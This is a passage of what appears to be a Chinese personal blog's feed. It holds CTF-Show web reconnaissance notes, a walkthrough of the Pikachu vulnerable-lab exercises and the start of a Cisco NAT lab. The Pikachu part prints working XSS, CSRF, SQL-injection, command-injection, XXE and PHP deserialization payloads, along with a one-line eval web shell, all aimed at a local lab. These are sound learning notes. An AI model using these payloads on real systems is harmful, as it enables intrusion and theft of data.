alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%204.png"></p><p>获得flag</p><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>题目提示 <code>解压源码到当前目录，测试正常，收工</code></p><p>一般运维会将网站目录压缩为 <a href="http://www.zip/">www.zip</a> ，访问后获得压缩包</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%205.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%205.png"></p><p>解压获得flag</p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p><code>版本控制很重要，但不要部署到生产环境更重要。</code></p><p>关键词：版本控制，访问 /.git/</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%206.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%206.png"></p><p>直接获得flag</p><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>要求同上，版本控制一般有 .git 或者 .svn， 访问.svn</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%207.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%207.png"></p><h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p>关键词：vim</p><p>vim 在未正常关闭的时候会生成 .swp 文件</p><p>访问 /index.php.swp</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%208.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%208.png"></p><h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>关键词：cookie</p><p>使用 editthiscookie 打开查看得</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%209.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%209.png"></p><h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p>关键词：域名隐藏信息</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelly ~]# nslookup </span><br><span class="line">&gt; set type=TXT</span><br><span class="line">&gt; ctfshow.com</span><br><span class="line"><span class="attr">Server</span>:         <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"><span class="attr">Address</span>:        <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>#<span class="number">53</span></span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">ctfshow.com     text = <span class="string">&quot;flag&#123;just_seesee&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">Authoritative answers can be found <span class="keyword">from</span>:</span><br><span class="line">&gt; exit</span><br></pre></td></tr></table></figure><h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p>访问 /robots.txt 获得内容</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: <span class="regexp">/admin/</span></span><br></pre></td></tr></table></figure><p>访问 /admin </p><p>他404</p><p>把我整不会了</p><h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2010.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2010.png"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2011.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2011.png"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2012.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2012.png"></p><h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><p>提示中说明了 editor 翻找源代码发现有个/editor/uploads/xxx.png ，发现 /editor 可以直接访问</p><p>访问后点击上传附件按钮，点击文件空间</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2013.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2013.png"></p><p>发现 /var/www/html/nothinghere 存在文件 /fl000g.txt</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2014.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2014.png"></p><p>根据路径访问，获得flag</p><h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><p>在网页底部获得邮箱 <a href="mailto:1156631961@qq.com">1156631961@qq.com</a> ，qq号查询发现是西安的</p><p>访问 /admin 忘记密码，填写西安，重置密码获得flag</p><h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><p>访问 /tz.php ,点击phpinfo搜索flag</p><h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><p>在控制台直接修改score，访问 /110.php 获得flag</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2015.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2015.png"></p><h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><p>方向错了方向错了，我还想着我怎么解密呢，原来这题不用解密</p><p>右键查看源代码，获取用户名和加密后的密码，填入输入框，在控制台输入$(“#loginForm”).submit(); 获取flag</p><h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><p>这题没经验是真不会</p><p>早期access存放路径 /db/db.mdb，访问后搜索</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2016.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2016.png"></p><h1 id="错漏补充"><a href="#错漏补充" class="headerlink" title="错漏补充"></a>错漏补充</h1><ul><li><p>信息收集——装一些插件（待补充），写工具（知识武器化），写 CheckList</p></li><li><p>vim会产生 .swp / .swo / .swn ，gedit会产生 文件名～的备份文件名</p></li><li><p>webpack的反编译</p></li><li><p>svn信息泄漏工具 SvnExploit</p></li><li><p>Apache的php解析漏洞（CVE-2017-15715），上传文件gif文件头后路径结尾为 .php/ 可以使用</p></li><li><p>替换关键文件使用mv来覆盖</p></li><li><p>HTTP协议头部，常见的字段</p></li><li><p>搞安全的整个昵称</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章为 Klee-CTF 专题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; title=&quot;web1&quot;&gt;&lt;/a&gt;web1&lt;/h1&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="CTF" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>【Klee-CTF】 Pikachu 漏洞练习</title>
    <link href="https://guo.moe/archives/Pikachu-exercise.html"/>
    <id>https://guo.moe/archives/Pikachu-exercise.html</id>
    <published>2021-07-29T04:00:00.000Z</published>
    <updated>2021-08-30T12:28:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章为 Klee-CTF 专题</p></blockquote><h1 id="准备资料"><a href="#准备资料" class="headerlink" title="准备资料"></a>准备资料</h1><p>弱密码资料：<a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials">https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials</a></p><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的破解"><a href="#基于表单的破解" class="headerlink" title="基于表单的破解"></a>基于表单的破解</h2><p>使用 burpsuite ，一般用户名使用admin，密码可以通过burpsuite破解</p><span id="more"></span><p><img data-src="Pikachu-exercise/Untitled.png" alt="Pikachu-exercise/Untitled.png"></p><p>首先输入 admin admin 构造一个请求</p><p><img data-src="Pikachu-exercise/Untitled%201.png" alt="Pikachu-exercise/Untitled%201.png"></p><p><img data-src="Pikachu-exercise/Untitled%202.png" alt="Pikachu-exercise/Untitled%202.png"></p><p><img data-src="Pikachu-exercise/Untitled%203.png" alt="Pikachu-exercise/Untitled%203.png"></p><p>清除一下无关参数，只保留 password</p><p>回到burpsuite，发现有一个payload的长度明显有点问题</p><p><img data-src="Pikachu-exercise/Untitled%204.png" alt="Pikachu-exercise/Untitled%204.png"></p><p>输入测试，诶成了</p><p><img data-src="Pikachu-exercise/Untitled%205.png" alt="Pikachu-exercise/Untitled%205.png"></p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过 (on server)"></a>验证码绕过 (on server)</h2><p>对网络请求，提取出关键，发现当且仅当访问 <a href="http://172.16.40.2/pikachu/inc/showvcode.php">http://172.16.40.2/pikachu/inc/showvcode.php</a> 时，验证码才会发生改变，连续curl以下内容时，验证码是始终保持有效的</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://172.16.40.2/pikachu/vul/burteforce/bf_server.php&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Cookie: PHPSESSID=8768b544b64dd8fc234b2b936c37c4ab; KOD_SESSION_ID=95908a94410cbb3970b38095670462ca; CSRF_TOKEN=xRTn99HD7XY3BFEs&#x27;</span> \</span><br><span class="line">  --data-raw <span class="string">&#x27;username=admin&amp;password=admin&amp;vcode=gynqsw&amp;submit=Login&#x27;</span> \</span><br><span class="line">  --compressed</span><br></pre></td></tr></table></figure><p>接下来的操作步骤和上面一致。</p><h1 id="反射型xss（get）-存储型xss"><a href="#反射型xss（get）-存储型xss" class="headerlink" title="反射型xss（get）/ 存储型xss"></a>反射型xss（get）/ 存储型xss</h1><p><a href="http://192.168.44.128:8080/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(1)%3C/script%3E&submit=submit#"><code>http://192.168.44.128:8080/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(1)&lt;%2Fscript&gt;&amp;submit=submit#</code></a></p><p><a href="https://segmentfault.com/a/1190000021899373">https://segmentfault.com/a/1190000021899373</a></p><p>在message内写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![Pikachu-exercise/Untitled%206.png](Pikachu-exercise/Untitled%206.png)</span><br><span class="line"></span><br><span class="line"># DOM 型 xss/DOM 型 xss-x</span><br><span class="line"></span><br><span class="line">1. 在框内输入 `javascript:alert(1)` ，点击链接触发</span><br><span class="line"></span><br><span class="line">![Pikachu-exercise/Untitled%207.png](Pikachu-exercise/Untitled%207.png)</span><br><span class="line"></span><br><span class="line">1. 在本页面不做任何操作就触发</span><br><span class="line"></span><br><span class="line">尝试：</span><br><span class="line"></span><br><span class="line">- `&#x27; &gt;&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a&gt;` 结果看页面是有了，但是没法弹出来</span><br><span class="line">- `&#x27;onmousemove=&quot;alert(1)&quot;` 在链接上移动触发</span><br><span class="line"></span><br><span class="line">![Pikachu-exercise/Untitled%208.png](Pikachu-exercise/Untitled%208.png)</span><br><span class="line"></span><br><span class="line"># CSRF(get)/CSRF(post)</span><br><span class="line"></span><br><span class="line">该链接修改信息参数都放在url上，所以要修改可以直接从url下手</span><br><span class="line"></span><br><span class="line">```jsx</span><br><span class="line">http://192.168.44.128:8080/vul/csrf/csrfget/csrf_get_edit.php?sex=2&amp;phonenum=2&amp;add=2&amp;email=2&amp;submit=submit</span><br></pre></td></tr></table></figure><p>可修改 sex，phonenum，add等参数，并通过ajax无感知地修改用户的数据。不行就整个链接嘛，或者window.open</p><p>直接javascript，</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&quot;http://192.168.44.128:8080/vul/csrf/csrfget/csrf_get_edit.php?sex=2&amp;phonenum=2&amp;add=2&amp;email=2&amp;submit=submit&quot;</span>)</span><br></pre></td></tr></table></figure><p>post同理，可以用form构造</p><p>网站源码？拿来吧你，随便找个html套上然后改一下这个action为目标页面就可</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;http://192.168.44.128:8080/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span><br><span class="line">   <span class="xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;per_title&quot;</span>&gt;</span>hello,,欢迎来到个人会员中心 | <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color:bule;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;csrf_post.php?logout=1&quot;</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">   <span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_name&quot;</span>&gt;</span>姓名:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">   &lt;p class=&quot;per_sex&quot;&gt;性别:&lt;input type=&quot;text&quot; name=&quot;sex&quot; value=&quot;&quot;&gt;&lt;/p&gt;</span><br><span class="line">   &lt;p class=&quot;per_phone&quot;&gt;手机:&lt;input class=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;&quot;&gt;&lt;/p&gt;    </span><br><span class="line">   &lt;p class=&quot;per_add&quot;&gt;住址:&lt;input class=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;&quot;&gt;&lt;/p&gt; </span><br><span class="line">   &lt;p class=&quot;per_email&quot;&gt;邮箱:&lt;input class=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;&quot;&gt;&lt;/p&gt; </span><br><span class="line">   &lt;input class=&quot;sub&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">   &lt;/form&gt;</span><br></pre></td></tr></table></figure><h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>输入 <code>a&#39; or 1=1 #</code> 即可匹配所有用户， <code>%%</code> 也行，%是通配符</p><p><img data-src="Pikachu-exercise/Untitled%209.png" alt="Pikachu-exercise/Untitled%209.png"></p><h1 id="基于-boolian-的盲注"><a href="#基于-boolian-的盲注" class="headerlink" title="基于 boolian 的盲注"></a>基于 boolian 的盲注</h1><p>当你已经知道了数据库中存在一个为kobe的用户，这里相当于一个判断语句只能给你返回是或否，注入可以利用其判断语句+判断字符来判断其完整字符串。</p><p>比如此处输入 <code>kobe</code>，可以正常地返回其信息</p><p>而输入 <code>kobe&#39; and 1=1#</code> 也可以， <code>kobe&#39; and 1=2#</code> 就不行了</p><p>但其他 MySQL 语句还是可以执行的嘛！不知道其他信息，靠判断猜！</p><p>比如说，MySQL里面有select, substr, ascii等语句，可以通过逐字符判断来判断其数据库名</p><h1 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h1><p>原理其实和上面差不多，也是利用信息来判断信息，只不过这里利用的是睡眠时间，使用判断条件+sleep(x)，满足条件的时候睡眠x秒</p><p><code>1&#39; or sleep(3)#</code> 来测试，<code>sleep()</code>可用</p><p>比如说我们在数据库中使用 <code>select if (database()=&#39;pikachu&#39;, sleep(5), 1)</code> ，使用了五秒，可以判断当前数据库名称为 <code>pikachu</code></p><h1 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h1><p>笑死，他的docker上没有ping，但是其他命令可以执行</p><p><code>;whoami;ls;pwd</code> ，是没有对输入ip进行过滤</p><p><img data-src="Pikachu-exercise/Untitled%2010.png" alt="Pikachu-exercise/Untitled%2010.png"></p><h1 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h1><p>我这里没开 allow_url_include，所以就不演示了，但远程可以构造一个txt文件，里面写</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">eval</span>($_GET[<span class="string">&#x27;x&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img data-src="Pikachu-exercise/Untitled%2011.png" alt="Pikachu-exercise/Untitled%2011.png"></p><h1 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h1><p>查看链接格式</p><p><a href="http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=kb.png">http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=kb.png</a></p><p>容易得知这个filename可以利用，修改为execdownload.php，404，应该图片被放在子目录了，那就修改为../execdownload.php，成功获取</p><p><a href="http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=../execdownload.php">http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=../execdownload.php</a></p><p><img data-src="Pikachu-exercise/Untitled%2012.png" alt="Pikachu-exercise/Untitled%2012.png"></p><h1 id="Unsafe-Fileupload→client-check"><a href="#Unsafe-Fileupload→client-check" class="headerlink" title="Unsafe Fileupload→client check"></a>Unsafe Fileupload→client check</h1><p>F12 直接把这个去掉，好像不行</p><p><img data-src="Pikachu-exercise/Untitled%2013.png" alt="Pikachu-exercise/Untitled%2013.png"></p><p>用burpsuite拦截响应请求把这个给去掉，重新上传，getdaze</p><p><img data-src="Pikachu-exercise/Untitled%2014.png" alt="Pikachu-exercise/Untitled%2014.png"></p><p><img data-src="Pikachu-exercise/Untitled%2015.png" alt="Pikachu-exercise/Untitled%2015.png"></p><h1 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h1><p>查看提示，使用 pikachu/000000 登录，发现只有查看权限</p><p><img data-src="Pikachu-exercise/Untitled%2016.png" alt="Pikachu-exercise/Untitled%2016.png"></p><p>使用admin/123456登录，发现有添加权限，地址为</p><p><a href="http://192.168.44.128:8080/vul/overpermission/op2/op2_admin_edit.php">http://192.168.44.128:8080/vul/overpermission/op2/op2_admin_edit.php</a></p><p>回到pikachu，同样访问上面地址，发现可以正常访问</p><p><img data-src="Pikachu-exercise/Untitled%2017.png" alt="Pikachu-exercise/Untitled%2017.png"></p><p>也可以正常添加</p><h1 id="→目录遍历"><a href="#→目录遍历" class="headerlink" title="../../→目录遍历"></a>../../→目录遍历</h1><p>用了哪些函数类型？</p><p>随便点击一个，发现地址有关键字 <code>xxx.php</code></p><p><img data-src="Pikachu-exercise/Untitled%2018.png" alt="Pikachu-exercise/Untitled%2018.png"></p><p>作死试试 <code>../../../index.php</code> ，笑死，还套娃了</p><p><img data-src="Pikachu-exercise/Untitled%2019.png" alt="Pikachu-exercise/Untitled%2019.png"></p><h1 id="敏感信息泄露→IcanseeyourABC"><a href="#敏感信息泄露→IcanseeyourABC" class="headerlink" title="敏感信息泄露→IcanseeyourABC"></a>敏感信息泄露→IcanseeyourABC</h1><p>F12查看，嚯哟这有个账号</p><p><img data-src="Pikachu-exercise/Untitled%2020.png" alt="Pikachu-exercise/Untitled%2020.png"></p><p><img data-src="Pikachu-exercise/Untitled%2021.png" alt="Pikachu-exercise/Untitled%2021.png"></p><p>登陆成功</p><h1 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h1><p>构造PHP payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> s();</span><br><span class="line"><span class="variable">$a</span>-&gt;test = <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>不过我猜测，这个类名和参数名有一个没猜对都没法用吧？</p><p><img data-src="Pikachu-exercise/Untitled%2022.png" alt="Pikachu-exercise/Untitled%2022.png"></p><p><img data-src="Pikachu-exercise/Untitled%2023.png" alt="Pikachu-exercise/Untitled%2023.png"></p><h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p>我看不懂，但我大受震撼.jpg</p><p>参考资料 <a href="https://www.freebuf.com/vuls/265859.html">https://www.freebuf.com/vuls/265859.html</a></p><p>根据文章，可以构造一个这样的恶意payload来获取任意文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p><img data-src="Pikachu-exercise/Untitled%2024.png" alt="Pikachu-exercise/Untitled%2024.png"></p><p>然后可以获取到 /etc/passwd 的内容了</p><h1 id="URL-重定向"><a href="#URL-重定向" class="headerlink" title="URL 重定向"></a>URL 重定向</h1><p>@某佛大SSO</p><p><a href="http://192.168.44.128:8080/vul/urlredirect/urlredirect.php?url=https://baidu.com">http://192.168.44.128:8080/vul/urlredirect/urlredirect.php?url=https://baidu.com</a></p><h1 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h1><p>这个curl可以用作访问仅限内网访问的应用，比如docker之间</p><p><img data-src="Pikachu-exercise/Untitled%2025.png" alt="Pikachu-exercise/Untitled%2025.png"></p><h1 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h1><ul><li><p>搜索型注入中 两个%是为了闭合，补充union等知识（比赛时一般都只能手工注入）</p><p>  <img data-src="Pikachu-exercise/Untitled%2026.png" alt="Pikachu-exercise/Untitled%2026.png"></p><p>  <a href="https://www.yuque.com/docs/share/a9f3ca4d-b032-46ab-ad68-459e0177d911#37039777">https://www.yuque.com/docs/share/a9f3ca4d-b032-46ab-ad68-459e0177d911?#37039777</a></p><p>  <a href="https://www.yuque.com/docs/share/6d18cc14-f0de-4b5f-aebe-6543304e48b1#">https://www.yuque.com/docs/share/6d18cc14-f0de-4b5f-aebe-6543304e48b1?#</a></p></li><li><p>XSS 是怎么实现反弹的</p><p>  实例源码：<a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2020/oStyle/bot.py">https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2020/oStyle/bot.py</a></p>  <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">client = webdriver.Chrome(<span class="string">&#x27;./chromedriver&#x27;</span>, chrome_options=chrome_options)</span><br><span class="line"></span><br><span class="line">client.add_cookie(&#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;this-is-for-you&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: FLAG, </span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>  一般可以通过 chromedriver 模拟访问来实现 xss 反弹，在访问的时候添加上 cookie 里的 flag</p></li><li><p>PHP 反序列化 <a href="https://xz.aliyun.com/t/6753">https://xz.aliyun.com/t/6753</a></p><p>  <img data-src="Pikachu-exercise/Untitled%2027.png" alt="Pikachu-exercise/Untitled%2027.png"></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章为 Klee-CTF 专题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;准备资料&quot;&gt;&lt;a href=&quot;#准备资料&quot; class=&quot;headerlink&quot; title=&quot;准备资料&quot;&gt;&lt;/a&gt;准备资料&lt;/h1&gt;&lt;p&gt;弱密码资料：&lt;a href=&quot;https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials&quot;&gt;https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;暴力破解&quot;&gt;&lt;a href=&quot;#暴力破解&quot; class=&quot;headerlink&quot; title=&quot;暴力破解&quot;&gt;&lt;/a&gt;暴力破解&lt;/h1&gt;&lt;h2 id=&quot;基于表单的破解&quot;&gt;&lt;a href=&quot;#基于表单的破解&quot; class=&quot;headerlink&quot; title=&quot;基于表单的破解&quot;&gt;&lt;/a&gt;基于表单的破解&lt;/h2&gt;&lt;p&gt;使用 burpsuite ，一般用户名使用admin，密码可以通过burpsuite破解&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://guo.moe/categories/CTF/"/>
    
    <category term="技术篇" scheme="https://guo.moe/categories/CTF/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
  </entry>
  
  <entry>
    <title>计算机网络原理实验五──地址转换NAT</title>
    <link href="https://guo.moe/archives/Principles-Of-Computer-Networks-Experiment-5.html"/>
    <id>https://guo.moe/archives/Principles-Of-Computer-Networks-Experiment-5.html</id>
    <published>2021-04-24T04:00:00.000Z</published>
    <updated>2021-06-11T09:18:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>1941 Router，2PC，使用 Copper Cross-over 连接，要求左接口ip为192.168.1.1，右接口ip为200.8.7.1，网络拓扑如下</p><p><img data-src="/images/Article/Principles-Of-Computer-Networks-Experiment/Network-Topology.png" alt="Network-Topology.png"></p><span id="more"></span><h2 id="配置接口g0-0"><a href="#配置接口g0-0" class="headerlink" title="配置接口g0/0"></a>配置接口g0/0</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Router&gt;en</span><br><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#int g0/<span class="number">0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip addr <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">0</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">0</span>, changed state to up</span><br></pre></td></tr></table></figure><h2 id="配置接口g0-1"><a href="#配置接口g0-1" class="headerlink" title="配置接口g0/1"></a>配置接口g0/1</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Router(config-<span class="keyword">if</span>)#int g0/<span class="number">1</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip addr <span class="number">200.8</span><span class="number">.7</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span 